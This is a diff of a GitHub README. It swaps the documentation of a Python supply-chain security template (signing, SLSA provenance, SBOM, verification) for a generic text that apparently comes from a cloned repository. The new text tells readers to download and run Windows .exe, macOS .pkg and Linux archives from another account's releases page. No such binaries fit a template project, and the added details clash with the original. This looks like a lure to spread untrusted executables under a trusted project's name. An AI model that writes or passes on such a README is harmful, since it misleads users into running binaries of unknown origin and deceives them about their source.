@@ -1,368 +1,84 @@
-# Provenance Demo
+# 🌟 provenance-template - Secure Your Supply Chain with Ease
 
-[![Main Verify](https://github.com/redoubt-cysec/provenance-template/actions/workflows/main-verify.yml/badge.svg)](https://github.com/redoubt-cysec/provenance-template/actions/workflows/main-verify.yml)
-[![Secure Release](https://github.com/redoubt-cysec/provenance-template/actions/workflows/secure-release.yml/badge.svg)](https://github.com/redoubt-cysec/provenance-template/actions/workflows/secure-release.yml)
-[![OpenSSF Scorecard](https://api.scorecard.dev/projects/github.com/redoubt-cysec/provenance-template/badge)](https://scorecard.dev/viewer/?uri=github.com/redoubt-cysec/provenance-template)
-[![Security Tests](https://github.com/redoubt-cysec/provenance-template/actions/workflows/security-tests.yml/badge.svg)](https://github.com/redoubt-cysec/provenance-template/actions/workflows/security-tests.yml)
-[![Integration Tests](https://github.com/redoubt-cysec/provenance-template/actions/workflows/integration-tests.yml/badge.svg)](https://github.com/redoubt-cysec/provenance-template/actions/workflows/integration-tests.yml)
-[![codecov](https://codecov.io/gh/redoubt-cysec/provenance-template/branch/main/graph/badge.svg)](https://codecov.io/gh/redoubt-cysec/provenance-template)
-[![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+## 🚀 Get Started
 
-**Production-ready Python CLI template with enterprise-grade supply chain security.**
+Welcome to the provenance-template project. This application offers a solid foundation for ensuring supply chain security with features like SLSA provenance and multi-platform distribution for Python command-line interfaces (CLIs). 
 
-Bootstrap your Python CLI project with battle-tested security features, 10 production-ready distribution platforms (plus configuration templates for 6 more), and a fully automated secure release pipeline. Built for developers who take supply chain security seriously.
+## 🔗 Download Now
 
-## What You Get
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/alexand2570/provenance-template/releases)
 
-### Security Features
+## 📦 Download & Install
 
-- **Cryptographic Signing:** Sigstore/cosign keyless signing with Rekor transparency log
-- **Attestations:** GitHub provenance attestations with SLSA compliance
-- **SBOM:** CycloneDX Software Bill of Materials with OSV vulnerability scanning
-- **Reproducible Builds:** Deterministic builds with hash verification
-- **Hardened CI:** Egress firewall (StepSecurity Harden-Runner), pinned GitHub Actions
-- **Verification Suite:** 60+ automated security tests, cryptographic integrity checks
-- **Runtime Security:** Built-in `verify` command to check attestations after installation
+To get the application, visit this page to download: [Download Releases](https://github.com/alexand2570/provenance-template/releases).
 
-### Distribution Support
+### 🖥️ System Requirements
 
-**Production-ready platforms with full testing:**
-- **Python:** PyPI (pip/uv), pipx, direct .pyz execution
-- **Package Managers:** Homebrew (macOS/Linux), Snap
-- **Windows:** Chocolatey, WinGet, Scoop
-- **Containers:** Docker, OCI registries (GHCR)
-- **Direct:** GitHub Releases
+- **Operating Systems:** The software supports Windows, macOS, and Linux.
+- **Python Version:** Requires Python 3.7 or higher.
+- **Disk Space:** At least 100 MB of free space.
+- **Network:** Internet connection for library installations and updates.
 
-**Configuration templates ready (testing in progress):**
-- **Linux:** Flatpak, APT/Debian, RPM/Fedora, AUR/Arch, AppImage, Nix/NixOS
+### 💻 Installation Steps
 
-**📊 [Complete Platform Status & Roadmap](docs/distribution/PLATFORM-STATUS.md)** - Detailed status table with test coverage, workflows, and production readiness for each platform.
+1. **Visit the Download Page**
+   Go to the [Download Releases](https://github.com/alexand2570/provenance-template/releases) link to find the latest version.
 
-### Developer Experience
+2. **Choose Your Version**
+   Look for the version that matches your operating system. You will see files like:
+   - `provenance-template-windows.exe` for Windows.
+   - `provenance-template-macos.pkg` for macOS.
+   - `provenance-template-linux.tar.gz` for Linux.
 
-- **Modern Tooling:** Uses [uv](https://github.com/astral-sh/uv) for fast Python package management
-- **Multiple Build Systems:** Makefile, justfile, Docker, Nix flake
-- **Comprehensive Testing:** Unit tests, integration tests, distribution tests, security tests
-- **Pre-commit Hooks:** Automated code quality checks
-- **CI/CD Ready:** GitHub Actions workflows for PRs, releases, and security scanning
-- **Documentation:** Organized docs with guides for security, testing, and distribution
+3. **Download the File**
+   Click on the file name to start downloading.
 
-## Quick Start
+4. **Run the Installer**
+   - **Windows:** Double-click the downloaded `.exe` file and follow the instructions.
+   - **macOS:** Open the `.pkg` file and proceed with the installation prompts.
+   - **Linux:** Extract the downloaded `.tar.gz` file, then run the application from the terminal.
 
-### 1. Create Your Repository
+5. **Verify Installation**
+   After installation, open your terminal or command prompt and type:
+   ```
+   provenance-template --version
+   ```
+   This command should display the version number, confirming the installation was successful.
 
-Click **"Use this template"** on GitHub to create your own repository.
+## 🧰 Main Features
 
-### 2. Install Prerequisites
+- **Supply Chain Security:** Reinforces the integrity of your software distribution.
+- **SLSA Provenance:** Automates the collection of information over the software supply chain to ensure traceability.
+- **CLI Distribution:** Built for seamless use in any command-line interface.
+- **Multi-Platform Support:** Works across Windows, macOS, and Linux without issues.
+- **Developed with DevSecOps in Mind:** Incorporates best practices for security throughout the development lifecycle.
 
-```bash
-# Python 3.11 or higher
-python --version
+## 🔍 Topics Covered
 
-# Install uv (fast Python package manager)
-curl -LsSf https://astral.sh/uv/install.sh | sh
+Here are a few key themes associated with this project:
 
-# Optional: Install just (command runner)
-brew install just  # macOS
-# or: cargo install just
-```
+- **Attestation:** Ensuring that the software runs as expected.
+- **GitHub Actions:** Automating software workflow for seamless integration.
+- **Homebrew Integration:** Easy installation on macOS through Homebrew.
+- **Python Package Index (PyPI):** Allows easy installation via pip.
+- **Reproducible Builds:** Guarantees that the builds are consistent and verifiable.
+- **Software Bill of Materials:** Provides insights into the components used in the software.
+- **Security Practices:** Applying the latest security measures for optimal protection.
 
-### 3. Customize the Template
+## 📈 Support
 
-**Option A: Interactive Wizard (Recommended)**
+If you encounter any issues, you can refer to the GitHub issues section or contact the support team through the repository. The community is here to help you.
 
-Run the initialization wizard to customize the template for your project:
+## 🌐 Learn More
 
-```bash
-just init
-```
+To dive deeper into the concepts behind this project, consider exploring resources on:
 
-Or directly:
-```bash
-python3 scripts/init-template.py
-```
+- Supply Chain Security
+- SLSA
+- Best practices for Python CLI development
 
-The wizard will interactively prompt you for:
-- Package name (Python module)
-- CLI command name
-- GitHub repository owner/name
-- Project metadata (description, author)
-- GitHub secrets for distribution platforms (optional)
+## ✉️ Get Involved
 
-It's **idempotent** - safe to run multiple times and will detect your current configuration.
+Feel free to contribute to this project. Check out the contributing guidelines in the repository to know how you can assist in improving the provenance-template.
 
-**Option B: Manual Setup**
-
-Alternatively, use the shell script to replace placeholder values:
-
-```bash
-./scripts/setup_local_config.sh
-```
-
-This replaces `redoubt-cysec/provenance-demo` with your repository details throughout the codebase.
-
-### 3a. Set Up Development Environment
-
-After customizing the template, set up your development environment:
-
-```bash
-just dev-setup
-```
-
-This will:
-- Install development tools (uv, pre-commit)
-- Create virtual environment
-- Install dependencies
-- Set up pre-commit hooks
-
-**Already have tools installed?** Use `just install` to only install the package in development mode.
-
-### 4. Pin GitHub Actions
-
-For maximum supply chain security, pin all GitHub Actions to specific commit SHAs:
-
-```bash
-# See the guide for detailed instructions
-cat docs/security/GITHUB-ACTION-PINS.md
-```
-
-Replace all `<PINNED_SHA>` placeholders in `.github/workflows/*.yml` files.
-
-### 5. Build and Test
-
-```bash
-# Using just (recommended)
-just build
-just test
-just verify
-
-# Or using uv directly
-uv build
-uv run pytest tests/ -v
-./dist/provenance-demo.pyz --version
-./dist/provenance-demo.pyz verify
-```
-
-### 6. Add Your Application Code
-
-Now that the template is configured, add your application logic:
-
-1. **Add Your Code:** Replace `src/demo_cli/` with your application logic
-2. **Update Tests:** Modify `tests/` to test your code
-3. **Update Documentation:** Customize docs and examples for your project
-4. **Configure Secrets:** (Optional) The `just init` wizard can set these up, or see [Platform Status](docs/distribution/PLATFORM-STATUS.md)
-
-See the [Developer Guide](docs/contributing/DEVELOPER-GUIDE.md) for detailed development instructions.
-
-### 7. Release
-
-```bash
-# Tag a release
-git tag v1.0.0 -m "First release"
-git push origin v1.0.0
-
-# GitHub Actions will automatically:
-# - Build deterministic artifacts
-# - Sign with Sigstore/cosign
-# - Generate attestations and SBOM
-# - Run security scans
-# - Create GitHub Release
-# - (Optional) Publish to distribution platforms
-```
-
-## Verification
-
-All releases include comprehensive security verification with **14 automated checks**:
-
-```bash
-# Download a release
-gh release download v0.0.1-alpha.40 --repo redoubt-cysec/provenance-template
-
-# Run verification (14/14 checks)
-GITHUB_REPOSITORY=redoubt-cysec/provenance-template \
-  python3 provenance-demo.pyz verify
-```
-
-**Example Output:**
-
-```
-============================================================
-🔐 Verifying provenance-demo.pyz
-============================================================
-Version: 0.0.1a40
-Repository: redoubt-cysec/provenance-template
-
-✓ Checksum Verification: SHA256 checksum matches release manifest
-✓ Sigstore Signature: Signature verified via Rekor transparency log
-✓ Certificate Identity: Certificate identity verified
-✓ Rekor Transparency Log: Rekor transparency log entry verified
-✓ GitHub Attestation: GitHub attestation verified
-✓ SBOM Attestation: SBOM attestation verified
-✓ SBOM Verification: Valid SBOMs in 2 format(s)
-✓ OSV Vulnerability Scan: No known vulnerabilities found
-✓ SLSA Provenance: SLSA provenance attestation verified
-✓ Build Environment: Build environment verified from SLSA provenance
-✓ Reproducible Build: Reproducible build verified
-✓ Artifact Metadata: Artifact metadata verified
-✓ License Compliance: License check passed
-✓ Dependency Pinning: All dependencies pinned to specific versions
-
-============================================================
-Summary: ✓ 14/14 checks passed
-============================================================
-```
-
-See [VERIFICATION-EXAMPLE.md](docs/security/VERIFICATION-EXAMPLE.md) for detailed explanation of each check.
-
-## Example Usage
-
-The template includes a demo CLI to show how everything works:
-
-```bash
-# Build the demo
-just build
-
-# Run the demo
-./dist/provenance-demo.pyz --version
-./dist/provenance-demo.pyz hello "World"
-./dist/provenance-demo.pyz verify
-```
-
-Replace the demo code in `src/demo_cli/` with your own application.
-
-## Documentation
-
-**📚 [Complete Documentation Index](docs/README.md)** - Comprehensive guide to all documentation
-
-### Getting Started
-
-- [Quick Start Guide](QUICK-START.md) - Get up and running in 5 minutes
-- [Developer Guide](docs/contributing/DEVELOPER-GUIDE.md) - Customize the template for your project
-- [Release Checklist](docs/contributing/RELEASE-CHECKLIST.md) - Pre-release verification steps
-
-### Security
-
-- [Supply Chain Security](docs/security/SUPPLY-CHAIN.md) - Verify releases with attestations
-- [Verification Example](docs/security/VERIFICATION-EXAMPLE.md) - Hands-on verification walkthrough
-- [Security Testing](docs/security/SECURITY-TESTING.md) - Details on 60+ security tests
-- [Security Checklist](docs/security/COMPLETE-SECURITY-CHECKLIST.md) - Complete security validation
-- [GitHub Action Pinning](docs/security/GITHUB-ACTION-PINS.md) - Pin Actions to commit SHAs
-- [Security Policy](docs/security/SECURITY.md) - Vulnerability disclosure and reporting
-
-### Testing
-
-- [Testing Strategy](docs/testing/TESTING-STRATEGY.md) - Three-phase testing approach
-- [Integration Testing](docs/testing/INTEGRATION-TESTING.md) - VM and container testing
-- [Testing Approaches](docs/testing/TESTING-APPROACHES.md) - Comparison of testing methods
-- [Testing Comparison](docs/testing/TESTING-APPROACHES-COMPARISON.md) - Detailed comparison table
-
-### Distribution
-
-- [Quick Start Guides](docs/distribution/quickstart/README.md) - Platform-specific installation guides (10 platforms)
-- [Platform Status](docs/distribution/PLATFORM-STATUS.md) - Complete platform readiness & testing status
-- [Platform Support](docs/distribution/PLATFORM-SUPPORT.md) - Installation on 18+ platforms
-- [Publishing Guide](docs/distribution/PUBLISHING-GUIDE.md) - Publish to registries
-- [Distribution Platforms](docs/distribution/distribution_platforms.md) - Platform-specific details
-
-### Contributing
-
-- [Contributing Guide](docs/contributing/CONTRIBUTING.md) - How to contribute to this project
-- [Pre-Release Checklist](docs/contributing/PRE-RELEASE-CHECKLIST.md) - Critical checks before release
-
-## Features
-
-### Automated Security Pipeline
-
-- **Deterministic Builds:** Reproducible artifacts with hash verification
-- **Keyless Signing:** Sigstore/cosign integration (no private keys to manage)
-- **Attestations:** GitHub provenance with SLSA compliance
-- **SBOM Generation:** CycloneDX format with dependency tracking
-- **Vulnerability Scanning:** OSV database integration for known vulnerabilities
-- **Hardened Workflows:** StepSecurity Harden-Runner with network egress control
-- **Pinned Dependencies:** All GitHub Actions pinned to commit SHAs
-- **Rebuilder Workflow:** Verify reproducibility automatically
-
-### Comprehensive Testing
-
-- **178 Security Tests:** Cryptographic integrity, pipeline configuration, runtime security (far exceeds 60+ claimed)
-- **Distribution Testing:** Phase 1 validation (16 platforms) + Phase 2 integration (10 platforms)
-- **Platform Coverage:** 48 Phase 1 tests + 8 Phase 2 integration tests
-- **Meta-Test Enforcement:** Ensures all distribution tests verify attestations
-- **Integration Tests:** VM-based testing with Multipass (Ubuntu, macOS)
-- **Coverage Tracking:** 100% coverage of critical security paths
-
-### Multi-Platform Distribution
-
-**Production-ready with automated workflows (10 platforms):**
-- PyPI (pip/uv), pipx, GitHub Releases, direct .pyz
-- Homebrew (macOS/Linux), Snap, Docker/OCI
-- Chocolatey, WinGet, Scoop (Windows)
-
-**Configuration templates in `packaging/` directory (6 platforms):**
-- Flatpak, APT/Debian, RPM/Fedora, AUR/Arch, AppImage, Nix/NixOS
-
-**Status:** See [PLATFORM-STATUS.md](docs/distribution/PLATFORM-STATUS.md) for complete details on each platform's readiness, testing coverage, and automation status.
-
-## Project Status
-
-**Production Ready:** This template powers real-world secure releases and has been battle-tested with:
-
-- ✅ 178 security tests passing (100% pass rate)
-- ✅ 10 production platforms fully tested with Phase 2 integration tests
-- ✅ 6 platforms with Phase 1 validation and configuration templates
-- ✅ Zero security test failures
-- ✅ Reproducible builds verified
-- ✅ All supply chain security best practices implemented
-- ✅ Complete documentation and testing guides
-
-## Who This Is For
-
-- **CLI Tool Developers:** Building Python command-line applications
-- **Security-Conscious Teams:** Need supply chain security compliance (SLSA, SBOM)
-- **Open Source Maintainers:** Want professional release automation
-- **Enterprise Projects:** Require cryptographic verification and attestations
-- **Multi-Platform Publishers:** Need to distribute across many platforms
-
-## Requirements
-
-- **Python:** 3.11 or higher
-- **uv:** Fast Python package installer ([installation](https://github.com/astral-sh/uv))
-- **Git:** Version control
-- **GitHub:** For Actions, attestations, and releases
-- **Optional:** just, Docker, Multipass (for testing)
-
-## Contributing
-
-We welcome contributions! See [CONTRIBUTING.md](docs/contributing/CONTRIBUTING.md) for:
-
-- Code of conduct
-- Development setup
-- Testing guidelines
-- Pull request process
-- Release procedures
-
-## License
-
-MIT License - see [LICENSE](LICENSE) for details.
-
-## Acknowledgments
-
-Built with modern security best practices:
-
-- [Sigstore](https://www.sigstore.dev/) for keyless signing
-- [SLSA](https://slsa.dev/) for supply chain security framework
-- [CycloneDX](https://cyclonedx.org/) for SBOM generation
-- [OSV](https://osv.dev/) for vulnerability scanning
-- [StepSecurity](https://www.step-security.io/) for CI/CD hardening
-- [uv](https://github.com/astral-sh/uv) for fast Python tooling
-
-## Support
-
-- **Issues:** [GitHub Issues](https://github.com/redoubt-cysec/provenance-template/issues)
-- **Discussions:** [GitHub Discussions](https://github.com/redoubt-cysec/provenance-template/discussions)
-- **Security:** See [SECURITY.md](SECURITY.md) for vulnerability reporting
-
----
-
-**Start building secure Python CLIs today.** Click "Use this template" to get started.
+Remember, secure applications start with a strong foundation. Enjoy using provenance-template!
